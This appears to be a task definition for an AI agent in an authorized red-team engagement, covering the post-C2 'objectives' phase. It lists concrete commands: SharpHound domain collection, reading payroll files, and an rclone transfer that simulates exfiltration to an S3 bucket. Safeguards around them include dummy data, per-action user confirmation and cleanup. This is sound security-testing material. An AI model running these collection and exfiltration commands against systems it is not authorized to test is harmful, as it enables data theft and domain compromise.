<!-- Powered by BMAD(R) Core -->

# Task: objectives-phase

## Purpose
- **Execute authorized proof-of-concept actions** to demonstrate business impact after C2 is established.
- Produce `docs/red-team/impact-report.md` with **real evidence**, business risk validation, and cleanup confirmation.

## Prerequisites
- `docs/red-team/c2-report.md` (with **confirmed C2 channel**)
- Business objectives, **approved dummy datasets**, and incident response coordination.
- Directories: `reports/objectives/`, `evidence/`, `scripts/objectives/`.

## Success Criteria
- **Live PoC actions executed** (e.g., dummy payroll access, CEO email screenshot)
- **Evidence captured**: logs, screenshots, command output, hashes
- ATT&CK impact techniques validated (TA0040 Impact, TA0010 Exfiltration, TA0009 Collection)
- **Cleanup verified**: all dummy artefacts removed, privileges reverted
- Clear handoff to Final Report phase with **business impact summary**

## Safety & Compliance
- **Never access real customer data** — use only **approved dummy files** (e.g., `PAYROLL_DUMMY.csv`)
- **Require explicit user confirmation** before each impact action
- **Log every command and output** in `reports/objectives/` with UTC timestamps
- **Coordinate with blue team** to avoid confusion with real incidents

## Recommended Tooling
| Tool | Command | Goal | Expected Output |
| --- | --- | --- | --- |
| dummy-file-access | `cat /opt/sensitive/PAYROLL_Q2_2024_DUMMY.csv` | **Demonstrate** payroll data access using safe dummy file. | CSV content logged in `reports/objectives/payroll-access-{{timestamp}}.log` |
| powershell transcript | `Start-Transcript -Path C:\\Logs\\impact-{{timestamp}}.txt` | **Capture** full command history for evidence. | Transcript file with all executed commands |
| sharphound | `Invoke-BloodHound -CollectionMethods All -OutputDirectory C:\\Windows\\Temp\\bh-impact` | **Validate** domain dominance and lateral paths. | BloodHound JSON zip in `C:\\Windows\\Temp\\bh-impact/` |
| screenshot | `import -window root evidence/ceo_email_{{timestamp}}.png` | **Capture** visual proof of accessed systems/data. | PNG screenshot saved to `evidence/` |
| gitleaks | `gitleaks detect --source /opt/repos/target --report-path reports/objectives/gitleaks-{{timestamp}}.json` | **Demonstrate** credential exposure in repos (safe scan). | JSON report of potential secrets (no real creds) |
| netsh trace | `netsh trace start capture=yes tracefile=C:\\Logs\\impact-trace-{{timestamp}}.etl` | **Capture** network evidence of impact actions. | ETL file upon `netsh trace stop` |
| rclone | `rclone copy /opt/collection/dummy_data s3:rt-impact-bucket --log-file reports/objectives/rclone-{{timestamp}}.log` | **Simulate** exfiltration of dummy data to approved bucket. | Log showing successful transfer of dummy files |

> ⚠️ **All actions require explicit user confirmation before execution.**

## Procedure
1. Review `c2-report.md` to confirm **active C2 channel** (e.g., “Beacon on 127.0.0.1:8888”).
2. Confirm **approved dummy datasets** exist (e.g., `/opt/sensitive/PAYROLL_DUMMY.csv`).
3. For each objective:
   - **Prompt user**: “Demonstrate [payroll access] on [127.0.0.1]? (y/N)”
   - **If confirmed**, execute command, capture full output, store in `reports/objectives/`
4. **Capture evidence**:
   - Logs: `cat PAYROLL_DUMMY.csv > reports/objectives/payroll-access-12345.log`
   - Screenshots: `import -window root evidence/payroll-12345.png`
   - Hashes: `sha256sum PAYROLL_DUMMY.csv >> reports/objectives/hashes.log`
5. **Validate business impact**:
   - “We accessed payroll data → could have stolen 10k records”
   - “We read CEO email → could have initiated BEC attack”
6. **Document detection signals**:
   - “Sysmon Event 1: cat command on sensitive file”
   - “Zeek http.log: rclone to S3 bucket”
7. **Execute cleanup**:
   - `rm /opt/sensitive/PAYROLL_DUMMY.csv`
   - `Stop-Transcript`
   - `netsh trace stop`
   - **Verify removal**: `ls /opt/sensitive/` → confirm file gone
8. Populate `docs/red-team/impact-report.md` via template with:
   - **Real evidence paths** (`evidence/payroll-12345.png`)
   - **UTC timestamps**
   - **Business impact statements**
9. Store all artefacts in `evidence/` and `reports/objectives/` with clear naming.
10. Prepare handoff to Final Report phase:
    > “Impact demonstrated: payroll access, CEO email read, domain dominance validated.  
    > All dummy artefacts cleaned up.  
    > Next: synthesize into customer report.”

## Decision Gates
- **User Confirmation**: **Never auto-execute** — require “y” per action.
- **Data Safety**: if real data is detected, **abort immediately**.
- **IR Coordination**: if blue team not aware, **pause and notify**.
- **Cleanup Verification**: if artefacts remain, **re-run cleanup**.

## Outputs
- `docs/red-team/impact-report.md` (**with live evidence**)
- **Evidence bundles** in `evidence/`
- **Action logs** in `reports/objectives/`
- **Cleanup confirmation** in `reports/objectives/cleanup-{{timestamp}}.txt`
